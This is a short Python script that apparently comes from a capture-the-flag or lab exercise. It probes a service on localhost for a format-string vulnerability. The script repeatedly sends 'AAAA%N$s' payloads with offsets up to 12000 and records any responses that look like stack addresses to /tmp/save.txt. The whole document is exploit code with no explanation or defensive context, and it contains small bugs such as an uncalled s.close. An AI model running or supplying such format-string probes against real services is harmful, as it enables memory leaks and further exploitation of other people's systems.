import telnetlib
import socket
import os

HOST = "127.0.0.1"
PORT = 56032



#s.connect((HOST, PORT))



offsetnumber = 0
if os.path.isfile("/tmp/save.txt"):
   os.remove("/tmp/save.txt")

fichier = open("/tmp/save.txt", "w")

sauvegarde = ""
while offsetnumber < 12000:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	exploit = "AAAA" + "%" + str(offsetnumber) + "$s"
		
	s.send(exploit)
	output = s.recv(1024)[4::]
	print(str(offsetnumber) + ": " + output)
	if (output.startswith("0xbfff")):
		sauvegarde += "Offset =" + str(offsetnumber) + " " + output + "\r"
		
	
	fichier.write(sauvegarde) 
	offsetnumber= offsetnumber+1
	s.close
	
fichier.close()
